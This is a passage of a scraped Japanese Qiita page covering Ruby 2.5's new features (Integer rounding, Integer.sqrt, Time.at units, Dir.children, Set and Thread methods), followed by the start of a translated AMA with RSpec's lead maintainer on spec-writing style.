  <span class="n">e</span><span class="o">.</span><span class="n">receiver</span> <span class="c1">#=&gt; {:foo=&gt;1, :bar=&gt;2}</span>
  <span class="n">e</span><span class="o">.</span><span class="n">key</span>      <span class="c1">#=&gt; :bax</span>
<span class="k">end</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/12063" rel="nofollow noopener" target="_blank">Feature #12063: KeyError#receiver and KeyError#name</a>
</li>
</ul>

<h2>
<span id="数値に関する新機能" class="fragment"></span><a href="#%E6%95%B0%E5%80%A4%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>数値に関する新機能</h2>

<h3>
<span id="roundfloorceiltruncateでレシーバをfloatに変換しなくなった" class="fragment"></span><a href="#roundfloorceiltruncate%E3%81%A7%E3%83%AC%E3%82%B7%E3%83%BC%E3%83%90%E3%82%92float%E3%81%AB%E5%A4%89%E6%8F%9B%E3%81%97%E3%81%AA%E3%81%8F%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>round/floor/ceil/truncateでレシーバをFloatに変換しなくなった</h3>

<p>Ruby 2.4までは<code>round</code>メソッドを使うと、レシーバをFloatに変換してから四捨五入をしていました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="mi">2</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#=&gt; 2.0</span>
</pre></div></div>

<p>そのため、大きな数になると丸め誤差の関係で数学的におかしな結果が返ってきていました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>      <span class="c1">#=&gt; 1.0e+25</span>
<span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span> <span class="c1">#=&gt; 10000000000000000905969664</span>
</pre></div></div>

<p>Ruby 2.5では無理にFloatに変換しないので、数学的に正しい結果が返ります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="mi">2</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>        <span class="c1">#=&gt; 2</span>
<span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="n">round</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#=&gt; 10000000000000000000000000</span>
</pre></div></div>

<p>これは<code>floor</code>/<code>ceil</code>/<code>truncate</code>についでも同様です。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c1">#=&gt; 10000000000000000000000000</span>
<span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>     <span class="c1">#=&gt; 10000000000000000000000000</span>
<span class="p">(</span><span class="mi">10</span><span class="o">**</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="n">truncate</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#=&gt; 10000000000000000000000000</span>
</pre></div></div>

<p>参考: <a href="https://bugs.ruby-lang.org/issues/13420" rel="nofollow noopener" target="_blank">Feature #13420: Integer#{round,floor,ceil,truncate} should always return an integer, not a float</a></p>

<h3>
<span id="正しい精度で平方根を返すintegersqrt" class="fragment"></span><a href="#%E6%AD%A3%E3%81%97%E3%81%84%E7%B2%BE%E5%BA%A6%E3%81%A7%E5%B9%B3%E6%96%B9%E6%A0%B9%E3%82%92%E8%BF%94%E3%81%99integersqrt"><i class="fa fa-link"></i></a>正しい精度で平方根を返すInteger.sqrt</h3>

<p><code>round</code>メソッドと同様、<code>Math.sqrt</code>メソッドも引数をFloatとして扱うために、大きな数では精度が狂うケースがありました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">n</span> <span class="o">=</span> <span class="mi">10</span><span class="o">**</span><span class="mi">46</span>
<span class="c1"># 数学的には 100000000000000000000000 が正</span>
<span class="no">Math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span> <span class="c1">#=&gt; 99999999999999991611392</span>
</pre></div></div>

<p>このようなケースではRuby 2.5で追加された<code>Integer.sqrt</code>を使うと、正しい値が返ってきます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="n">n</span> <span class="o">=</span> <span class="mi">10</span><span class="o">**</span><span class="mi">46</span>
<span class="nb">Integer</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="c1">#=&gt; 100000000000000000000000</span>
</pre></div></div>

<p>なお、平方根の値が小数になる場合は小数点以下が切り捨てられます。<br>
引数が整数以外の数値であれば、最初に整数に変換されてから平方根を計算します。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>      <span class="c1">#=&gt; 1.7320508075688772</span>
<span class="nb">Integer</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>   <span class="c1">#=&gt; 1</span>
<span class="nb">Integer</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="mi">9</span><span class="o">.</span><span class="mi">9</span><span class="p">)</span> <span class="c1">#=&gt; 3</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13219" rel="nofollow noopener" target="_blank">Feature #13219: bug in Math.sqrt(n).to_i, to compute integer squareroot, new word to accurately fix it</a>
</li>
</ul>

<h2>
<span id="日時に関する新機能" class="fragment"></span><a href="#%E6%97%A5%E6%99%82%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>日時に関する新機能</h2>

<h3>
<span id="timeatメソッドでミリ秒ナノ秒を指定できるようになった" class="fragment"></span><a href="#timeat%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%A7%E3%83%9F%E3%83%AA%E7%A7%92%E3%83%8A%E3%83%8E%E7%A7%92%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>Time#atメソッドでミリ秒/ナノ秒を指定できるようになった</h3>

<p><code>Time#at</code>メソッドでは第1引数にエポック秒を、第2引数にマイクロ秒を指定することができます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">format_time</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
  <span class="n">t</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">'%Y-%m-%d %H:%M:%S.%N'</span><span class="p">)</span>
<span class="k">end</span>

<span class="n">t</span> <span class="o">=</span> <span class="no">Time</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1514127600</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">format_time</span><span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="c1">#=&gt; "2017-12-25 00:00:00.000001000"</span>
</pre></div></div>

<p>Ruby 2.5では第3引数を指定することでミリ秒やナノ秒も設定できるようになりました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># ミリ秒</span>
<span class="n">format_time</span> <span class="no">Time</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1514127600</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:millisecond</span><span class="p">)</span>
<span class="c1">#=&gt; "2017-12-25 00:00:00.001000000"</span>

<span class="c1"># マイクロ秒</span>
<span class="n">format_time</span> <span class="no">Time</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1514127600</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:usec</span><span class="p">)</span>
<span class="c1">#=&gt; "2017-12-25 00:00:00.000001000"</span>
<span class="n">format_time</span> <span class="no">Time</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1514127600</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:microsecond</span><span class="p">)</span>
<span class="c1">#=&gt; "2017-12-25 00:00:00.000001000"</span>

<span class="c1"># ナノ秒</span>
<span class="n">format_time</span> <span class="no">Time</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1514127600</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:nsec</span><span class="p">)</span>
<span class="c1">#=&gt; "2017-12-25 00:00:00.000000001"</span>
<span class="n">format_time</span> <span class="no">Time</span><span class="o">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1514127600</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:nanosecond</span><span class="p">)</span>
<span class="c1">#=&gt; "2017-12-25 00:00:00.000000001"</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13919" rel="nofollow noopener" target="_blank">Feature #13919: Add a new method to create Time instances from unix time and nsec</a>
</li>
</ul>

<h2>
<span id="ファイルディレクトリ操作に関する新機能" class="fragment"></span><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%93%8D%E4%BD%9C%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>ファイル/ディレクトリ操作に関する新機能</h2>

<h3>
<span id="dirglobメソッドに起点となるディレクトリを指定できるbaseオプションが追加された" class="fragment"></span><a href="#dirglob%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%AB%E8%B5%B7%E7%82%B9%E3%81%A8%E3%81%AA%E3%82%8B%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%A7%E3%81%8D%E3%82%8Bbase%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%8C%E8%BF%BD%E5%8A%A0%E3%81%95%E3%82%8C%E3%81%9F"><i class="fa fa-link"></i></a>Dir#globメソッドに起点となるディレクトリを指定できるbaseオプションが追加された</h3>

<p>Ruby 2.5では<code>Dir#glob</code>メソッドに起点となるディレクトリを指定できるbaseオプションが追加されました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="c1"># ./test/dir_aディレクトリを起点とし、".rb"で終わるファイルを探す</span>
<span class="no">Dir</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="s1">'./*.rb'</span><span class="p">,</span> <span class="ss">base</span><span class="p">:</span> <span class="s1">'./test/dir_a'</span><span class="p">)</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13056" rel="nofollow noopener" target="_blank">Feature #13056: base option to Dir.glob</a>
</li>
</ul>

<h3>
<span id="やを返さないdirchildreneach_childメソッド" class="fragment"></span><a href="#%E3%82%84%E3%82%92%E8%BF%94%E3%81%95%E3%81%AA%E3%81%84dirchildreneach_child%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89"><i class="fa fa-link"></i></a>"."や".."を返さないDir#children/each_childメソッド</h3>

<p>Rubyには指定されたパス内のファイルエントリ名を返す<code>Dir#entries</code>メソッドがあります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Dir</span><span class="o">.</span><span class="n">entries</span><span class="p">(</span><span class="s1">'./test/dir_a'</span><span class="p">)</span>
<span class="c1">#=&gt; ['.', '..', 'code_a.rb', 'text_a.txt']</span>
</pre></div></div>

<p>ただし、上の結果を見ると分かるように<code>entries</code>メソッドでは"."や".."もファイルエントリとして返却されます。</p>

<p>Ruby 2.5で追加された<code>Dir#children</code>メソッドを使うと、"."や".."が含まれなくなります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Dir</span><span class="o">.</span><span class="n">children</span><span class="p">(</span><span class="s1">'./test/dir_a'</span><span class="p">)</span>
<span class="c1">#=&gt; ['code_a.rb', 'text_a.txt']</span>
</pre></div></div>

<p><code>Dir#each_child</code>メソッドは配列ではなく、Enumeratorオブジェクトを返します。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Dir</span><span class="o">.</span><span class="n">each_child</span><span class="p">(</span><span class="s1">'./test/dir_a'</span><span class="p">)</span>
<span class="c1">#=&gt; #&lt;Enumerator: Dir:each_child(\"./test/dir_a\")&gt;"</span>

<span class="no">Dir</span><span class="o">.</span><span class="n">each_child</span><span class="p">(</span><span class="s1">'./test/dir_a'</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span>
<span class="c1">#=&gt; ['code_a.rb', 'text_a.txt']</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/11302" rel="nofollow noopener" target="_blank">Feature #11302: Dir.entries and Dir.foreach without [".", ".."]</a>
</li>
</ul>

<h2>
<span id="setクラスに関する新機能" class="fragment"></span><a href="#set%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>Setクラスに関する新機能</h2>

<h3>
<span id="to_sがinspectのエイリアスメソッドになった" class="fragment"></span><a href="#to_s%E3%81%8Cinspect%E3%81%AE%E3%82%A8%E3%82%A4%E3%83%AA%E3%82%A2%E3%82%B9%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>to_sがinspectのエイリアスメソッドになった</h3>

<p>Ruby 2.5ではSetクラスの<code>to_s</code>メソッドが<code>inspect</code>メソッドのエイリアスメソッドになりました。<br>
これにより、要素の情報が表示されるようになります。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'set'</span>

<span class="n">s1</span> <span class="o">=</span> <span class="no">Set</span><span class="o">.</span><span class="n">new</span>
<span class="n">s1</span> <span class="o">&lt;&lt;</span> <span class="s1">'tic'</span> <span class="o">&lt;&lt;</span> <span class="s1">'tac'</span>

<span class="c1"># Ruby 2.4</span>
<span class="n">s1</span><span class="o">.</span><span class="n">to_s</span> <span class="c1">#=&gt; #&lt;Set:0x00007f83b98357e0&gt;</span>

<span class="c1"># Ruby 2.5</span>
<span class="n">s1</span><span class="o">.</span><span class="n">to_s</span> <span class="c1">#=&gt; #&lt;Set: {"tic", "tac"}&gt;</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13676" rel="nofollow noopener" target="_blank">Feature #13676: to_s method is not overriden for Set</a>
</li>
</ul>

<h3>
<span id="がincludeのエイリアスメソッドになった" class="fragment"></span><a href="#%E3%81%8Cinclude%E3%81%AE%E3%82%A8%E3%82%A4%E3%83%AA%E3%82%A2%E3%82%B9%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>===がinclude?のエイリアスメソッドになった</h3>

<p>Ruby 2.5ではSetクラスの<code>===</code>が<code>include?</code>のエイリアスメソッドになりました。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'set'</span>

<span class="no">Set</span><span class="o">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="o">].</span><span class="n">include?</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#=&gt; true</span>
<span class="no">Set</span><span class="o">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="o">].</span><span class="n">include?</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#=&gt; false</span>

<span class="no">Set</span><span class="o">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="o">]</span> <span class="o">===</span> <span class="mi">2</span> <span class="c1">#=&gt; true</span>
<span class="no">Set</span><span class="o">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="o">]</span> <span class="o">===</span> <span class="mi">5</span> <span class="c1">#=&gt; false</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13801" rel="nofollow noopener" target="_blank">Feature #13801: Implement case equality test for Set#===</a>
</li>
</ul>

<h2>
<span id="threadクラスに関する新機能" class="fragment"></span><a href="#thread%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%96%B0%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>Threadクラスに関する新機能</h2>

<h3>
<span id="スレッドに指定したキーのデータが格納されていなければデフォルト値を返すthreadfetchメソッド" class="fragment"></span><a href="#%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%81%AB%E6%8C%87%E5%AE%9A%E3%81%97%E3%81%9F%E3%82%AD%E3%83%BC%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E3%81%8C%E6%A0%BC%E7%B4%8D%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E3%83%87%E3%83%95%E3%82%A9%E3%83%AB%E3%83%88%E5%80%A4%E3%82%92%E8%BF%94%E3%81%99threadfetch%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89"><i class="fa fa-link"></i></a>スレッドに指定したキーのデータが格納されていなければデフォルト値を返すThread#fetchメソッド</h3>

<p>Rubyでは<code>Thread#[]</code>/<code>[]=</code>を使ってスレッド固有のデータを読み書きすることができます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">[</span><span class="ss">:foo</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'bar'</span>
<span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">[</span><span class="ss">:foo</span><span class="o">]</span> <span class="c1">#=&gt; "bar"</span>
</pre></div></div>

<p>Ruby 2.5では<code>Thread#fetch</code>メソッドが追加され、<code>Hash#fetch</code>メソッドと同じように指定されたキーが見つからないときのデフォルト値を指定することができます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">[</span><span class="ss">:foo</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'bar'</span>
<span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="ss">:foo</span><span class="p">,</span> <span class="s1">'baz'</span><span class="p">)</span>  <span class="c1">#=&gt; "bar"</span>
<span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="ss">:hoge</span><span class="p">,</span> <span class="s1">'baz'</span><span class="p">)</span> <span class="c1">#=&gt; "baz"</span>

<span class="c1"># 第2引数を指定しない場合はキーが見つからないとエラーになる</span>
<span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="ss">:foo</span><span class="p">)</span>  <span class="c1">#=&gt; "bar"</span>
<span class="no">Thread</span><span class="o">.</span><span class="n">current</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="ss">:hoge</span><span class="p">)</span> <span class="c1">#=&gt; KeyError: key not found: hoge</span>
</pre></div></div>

<ul>
<li>参考: <a href="https://bugs.ruby-lang.org/issues/13009" rel="nofollow noopener" target="_blank">Feature #13009: Implement fetch for Thread.current</a>
</li>
</ul>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>というわけで、本記事ではRuby 2.5の新機能や変更点をまとめてみました。</p>

<p>do/endブロックの中にbegin/endなしでrescueが書ける点や、定数探索のルールが変わって予期せぬ不具合が発生しにくくなった点は日常的な開発で嬉しいポイントだと思います。</p>

<p>一方で、バックトレースの並びが逆順になるのは「うーん、ちょっと」という気がしました。<br>
ただ、これはまだ「実験中」の仕様変更ですので、フィードバック次第では従来のままになる可能性もあります。</p>

<p>その他にもいろいろと興味深い新機能が追加されています。<br>
<code>yield_self</code>なんかはこれから面白い使い方を研究していきたくなるメソッドですね。</p>

<p>さあ、みなさんもぜひRuby 2.5の新機能を試してみてください！</p>

<h3>
<span id="あわせて読みたい" class="fragment"></span><a href="#%E3%81%82%E3%82%8F%E3%81%9B%E3%81%A6%E8%AA%AD%E3%81%BF%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>あわせて読みたい</h3>

<p>Ruby 2.3、2.4の新機能は以下の記事にまとめてあります。<br>
こちらもあわせてどうぞ。</p>

<ul>
<li><a href="https://qiita.com/jnchito/items/0faac073cb77417d61c7" id="reference-76fb074210ec59213c13">サンプルコードでわかる！Ruby 2.3の主な新機能 - Qiita</a></li>
<li><a href="https://qiita.com/jnchito/items/9f9d45581816f121af07" id="reference-eeadd8cfbdf641c745dc">サンプルコードでわかる！Ruby 2.4の新機能と変更点 - Qiita</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">65位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>162</kbd>
		<a target="_blank" href="https://qiita.com/jnchito/items/3a8d19fd9a30468cafd4">【翻訳】RSpecのリードメンテナだけど何か質問ある？</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-16<br />04:54:25</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/7465.html">jnchito</a>(165件の記事)<br />(SonicGarden Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/7465/profile-images/1500323590">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Ruby]</b> <b>[RSpec]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>先日、Redditでこんな記事が載っていました。</p>

<p><a href="https://www.reddit.com/r/ruby/comments/73nrhk/ama_the_authors_of_effective_testing_with_rspec_3/" rel="nofollow noopener" target="_blank">AMA: The authors of "Effective Testing with RSpec 3", Myron Marston and Ian Dees : ruby</a></p>

<p>この記事は書籍「<a href="https://pragprog.com/book/rspec3/effective-testing-with-rspec-3" rel="nofollow noopener" target="_blank">Effective Testing with RSpec 3</a>」の筆者であるMyron Marston氏とIan Dees氏が、書籍に関する質問に何でも答えます、という企画です。</p>

<p>この2人のうち、Myron Marston氏はRSpecの開発者（リードメンテナ）です。<br>
Q&amp;Aを読んでいると、RSpecの開発者ならではの意見だなと思うところがたくさんあり、なかなか興味深い議論になっていました。</p>

<p>というわけで、この記事では先ほどのQ&amp;Aから「これは日本のRubyプログラマにも役立ちそう」と思ったやりとりをピックアップして翻訳してみます。</p>

<h3>
<span id="ピックアップしたqaの一覧" class="fragment"></span><a href="#%E3%83%94%E3%83%83%E3%82%AF%E3%82%A2%E3%83%83%E3%83%97%E3%81%97%E3%81%9Fqa%E3%81%AE%E4%B8%80%E8%A6%A7"><i class="fa fa-link"></i></a>ピックアップしたQ&amp;Aの一覧</h3>

<p>この記事でピックアップしたのは以下の7つのやりとりです。</p>

<ul>
<li>RSpecの中で必要最小限のDSLをおすすめするなら？</li>
<li>シンプルなスタイルと複雑なスタイル、選ぶならどっち？</li>
<li>RSpecのDSLは全員覚えるべき？</li>
<li>RSpecとMinitestをどう比較する？</li>
<li>追加して後悔している機能は何？</li>
<li>power-assertってどう思う？</li>
<li>RSpecで今後チャレンジしたいことは？</li>
</ul>

<h3>
<span id="備考" class="fragment"></span><a href="#%E5%82%99%E8%80%83"><i class="fa fa-link"></i></a>備考</h3>

<ul>
<li>ここでピックアップしたのはすべてMyron Marston氏による回答です。</li>
<li>Myron Marston氏から翻訳の許可はもらっています。</li>
<li>翻訳で怪しいところがあれば、コメントや編集リクエストでやさしく指摘してやってください。</li>
</ul>

<p>ではここからがQ&amp;Aの翻訳です！</p>

<hr>

<h2>
<span id="q-rspecの中で必要最小限のdslをおすすめするなら" class="fragment"></span><a href="#q-rspec%E3%81%AE%E4%B8%AD%E3%81%A7%E5%BF%85%E8%A6%81%E6%9C%80%E5%B0%8F%E9%99%90%E3%81%AEdsl%E3%82%92%E3%81%8A%E3%81%99%E3%81%99%E3%82%81%E3%81%99%E3%82%8B%E3%81%AA%E3%82%89"><i class="fa fa-link"></i></a>Q. RSpecの中で必要最小限のDSLをおすすめするなら？</h2>

<p>RSpecのDSLには数多くの選択肢があり、そのためにチームメンバーが一貫した構成とスタイルを維持しながらきれいなコードを書くことを困難にしています。<br>
あなたがおすすめする何か必要最小限のDSLはありますか？</p>

<h2>
<span id="a-何はともあれdescribeとit" class="fragment"></span><a href="#a-%E4%BD%95%E3%81%AF%E3%81%A8%E3%82%82%E3%81%82%E3%82%8Cdescribe%E3%81%A8it"><i class="fa fa-link"></i></a>A. 何はともあれ、describeとit</h2>

<p>あなたがRSpecのどんな側面を便利で有用だと思うのかによって答えは変わってきますが、一般論としてはこうなるでしょう。</p>

<ul>
<li><p><code>describe</code>と<code>it</code>。本当に必要なのはこれだけです。それと、失敗を報告するために例外を発生させる<code>example</code>のいくつか。残りのRSpecのAPIは無視できますし、そうしても便利なCLIコマンドを活用することができます。</p></li>
<li><p>私はネストしたコンテキスト（<code>describe</code>と<code>context</code>を使うコード）が、テストを整理するのに便利だと感じています。そして、それをよく使います。</p></li>
<li><p><code>expect</code>とマッチャを組み合わせることでもたらされる、失敗時のメッセージとその柔軟性も便利だと思います。しかし、これは人によって意見が異なるかもしれません。もしシンプルなAPIがお好みなら、設定ファイルに1行加えるだけで（<code>config.expect_with :minitest</code>）Minitestのアサーションを使うことも可能です。</p></li>
<li><p><code>before</code>と<code>let</code>も特定の状況下では便利です。しかし、残念なことに現場では誤用/濫用されるケースもよくあります。十分なメリットがあるときにだけ、<code>before</code>や<code>let</code>を使うというのが私の経験則ですが、それがspecを書くときのデフォルトの方法だとは伝わっていないようです。</p></li>
<li><p>私は<code>subject</code>やワンライナー構文（例: <code>it { is_expected...}</code>）を使うことはほとんどありません。特定の分野のプロジェクト（例：<a href="https://github.com/sinatra/mustermann/blob/v1.0.1/mustermann/spec/sinatra_spec.rb" rel="nofollow noopener" target="_blank">mustermann</a>）ではワンライナー構文はうまく機能しますが、大半のプロジェクトではあまり有益なテクニックではないと考えています。</p></li>
</ul>

<p>というわけで、私からの一般論としてのアドバイスは、あなた自身をあまり制限しようとせずに、まずはシンプルな機能から始めて、十分なメリットがあるときにだけその他の機能を使うようにすることです。</p>

<hr>

<h2>
<span id="q-シンプルなスタイルと複雑なスタイル選ぶならどっち" class="fragment"></span><a href="#q-%E3%82%B7%E3%83%B3%E3%83%97%E3%83%AB%E3%81%AA%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E3%81%A8%E8%A4%87%E9%9B%91%E3%81%AA%E3%82%B9%E3%82%BF%E3%82%A4%E3%83%AB%E9%81%B8%E3%81%B6%E3%81%AA%E3%82%89%E3%81%A9%E3%81%A3%E3%81%A1"><i class="fa fa-link"></i></a>Q. シンプルなスタイルと複雑なスタイル、選ぶならどっち？</h2>

<p>最近私はspecを書く2つの異なるアプローチについて考えてきました。<br>
1つは「シンプルな」スタイルです。これはRSpecの最小限の機能を使います。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="no">RSpec</span><span class="o">.</span><span class="n">describe</span> <span class="no">FoodFactory</span><span class="p">,</span> <span class="s1">'#make_food'</span> <span class="k">do</span>
  <span class="n">it</span> <span class="s1">'makes bananas for monkeys'</span> <span class="k">do</span>
    <span class="n">factory</span> <span class="o">=</span> <span class="no">FoodFactory</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="ss">:monkey</span><span class="p">)</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">factory</span><span class="o">.</span><span class="n">make_food</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">eq</span><span class="p">(</span><span class="ss">:banana</span><span class="p">)</span>
  <span class="k">end</span>

